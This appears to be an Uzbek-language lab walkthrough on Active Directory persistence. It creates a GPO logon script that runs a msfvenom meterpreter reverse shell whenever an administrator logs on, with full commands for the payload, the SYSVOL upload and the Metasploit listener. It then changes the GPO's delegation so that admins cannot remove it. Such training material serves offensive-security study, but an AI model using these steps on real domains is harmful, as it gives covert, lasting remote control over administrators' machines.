
## **Domen darajasida barqarorlik**

GPO orqali barqarorlik o‘rnatishning keng tarqalgan usullari:

1. **Restricted Group Membership** – Bu bizga domen ichidagi barcha hostlarda administrator huquqini beradi.
2. **Logon Script Deployment** – Har safar foydalanuvchi domen hostiga kirganda shell callback (teskari ulanish) olishimizga imkon beradi.

Biz avvalgi *Exploiting AD* bo‘limida Restricted Group Membership’dan foydalanganmiz. Endi esa Logon Script usulini sinab ko‘ramiz. Administratorlar ishlayotgan vaqtda ularga ulanib olish uchun Admins OU (Organizational Unit) ga bog‘langan GPO yaratamiz. Bu GPO admin foydalanuvchi har qanday hostga kirganida shell olishimizni ta’minlaydi.

---

## **Tayyorlash bosqichi**

Birinchi navbatda shell, listener va uni ishga tushiradigan `.bat` fayl yaratamiz.

**1. msfvenom bilan shell exe yaratish:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe
```

> `<username>` o‘rningizga o‘zingizning nomingizni yozing. Bu boshqa foydalanuvchilar faylini almashtirib yubormaslik uchun kerak.

**2. Batch skript yaratish:**
`<username>_script.bat` faylini yarating:

```bat
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe
```

Bu skript:

* EXE faylni SYSVOL papkasidan mahalliy `C:\tmp\` ga nusxalaydi
* 20 soniya kutadi
* Shell exe’ni ishga tushiradi.

**3. Fayllarni SYSVOL papkasiga yuklash (SCP orqali):**

```bash
$thm scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
$thm scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

**4. MSF listener ishga tushirish:**

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445; exploit"
```

---

## **GPO yaratish**

**1. THMWRK1 ga RDP orqali kiring** va `runas` orqali Administrator bo‘lib terminal oching.
**2. MMC ni ishga tushiring**:

* `File -> Add/Remove Snap-in`
* **Group Policy Management** ni qo‘shing.

**3. Admins OU ustida o‘ng tugma -> Create a GPO in this domain, and Link it here**

* Masalan: `<username> - persisting GPO` deb nomlang.
* GPO’ni **Enforced** qiling.

**4. GPO ni tahrirlash:**

* `User Configuration -> Policies -> Windows Settings -> Scripts (Logon/Logoff)`
* **Logon** ustida o‘ng tugma -> Properties -> Scripts -> Add -> Browse
* SYSVOL’dagi `.bat` faylni tanlang.

Endi admin foydalanuvchi har safar tizimga kirganda bizga teskari ulanish keladi.

---

## **Test qilish**

1. Tier 1 admin parolini tiklang.
2. Listener’ni ishga tushiring.
3. THMSERVER1 yoki THMSERVER2 ga RDP qiling.
4. **Sign Out** qiling (Disconnect emas), keyin qayta login qiling.
5. 1 daqiqa ichida MSF konsolida callback olasiz:

```
meterpreter >
```

---

## **Ko‘zdan yashirish**

Barqarorlik ishlayotganini tekshirgach, uni o‘chirib tashlashni murakkablashtiramiz.

1. MMC’da GPO’ni tanlang, **Delegation** bo‘limiga o‘ting.
2. `ENTERPRISE DOMAIN CONTROLLERS` dagi **Edit settings, delete, modify security** huquqlarini olib tashlang.
3. `Authenticated Users` ni o‘chirib tashlang, o‘rniga `Domain Computers` qo‘shing (Read huquqi bilan).

Shundan so‘ng, hatto yuqori huquqli adminlar ham GPO’ni o‘chira olmaydi. U faqat **Domain Controller** mashina akkauntidan foydalanib o‘chirib bo‘ladi.
